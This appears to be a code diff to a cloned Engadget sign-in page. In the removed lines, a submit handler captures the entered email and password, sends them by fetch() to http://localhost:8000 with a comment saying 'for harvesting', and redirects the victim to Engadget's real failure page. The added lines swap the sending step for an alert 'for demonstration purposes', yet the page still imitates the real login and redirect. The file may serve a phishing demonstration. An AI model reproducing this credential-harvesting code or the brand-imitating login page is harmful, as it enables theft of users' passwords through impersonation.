@@ -27,7 +27,7 @@
                 <div id="login-challenge" class="primary">
                     <strong class="challenge-heading">Sign in</strong>
                     <span class="txt-align-center challenge-desc">Enter your email and password to sign in</span>
-                    <form id="login-form" method="GET" action="http://localhost:8000" class="challenge-form">
+                    <form id="login-form" method="GET" class="challenge-form">
                         <div class="input-group">
                             <input type="email" name="username" id="login-username" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder=" "/>
                             <label for="login-username" id="login-label" class="login-label">Email address</label>
@@ -79,21 +79,14 @@
     document.getElementById('login-form').addEventListener('submit', function(event) {
         event.preventDefault(); // Prevent default form submission
         const form = this;
-        const username = encodeURIComponent(form.querySelector('#login-username').value);
-        const password = encodeURIComponent(form.querySelector('#login-passwd').value);
-        const callbackUrl = `http://localhost:8000?username=${username}&password=${password}`;
+        const username = form.querySelector('#login-username').value;
+        const password = form.querySelector('#login-passwd').value;
         
-        // Send credentials to localhost (for harvesting)
-        fetch(callbackUrl, { method: 'GET' })
-            .then(() => {
-                // Redirect to failure page
-                window.location.href = 'https://login.engadget.com/account/challenge/fail';
-            })
-            .catch((error) => {
-                console.error('Error sending credentials:', error);
-                // Redirect to failure page even if fetch fails
-                window.location.href = 'https://login.engadget.com/account/challenge/fail';
-            });
+        // Show alert with credentials for demonstration
+        alert(`For demonstration purposes, this is what would appear in an HTTP log:\n\nUsername: ${username}\nPassword: ${password}`);
+        
+        // Redirect to failure page
+        window.location.href = 'https://login.engadget.com/account/challenge/fail';
     });
 </script>
 </body>
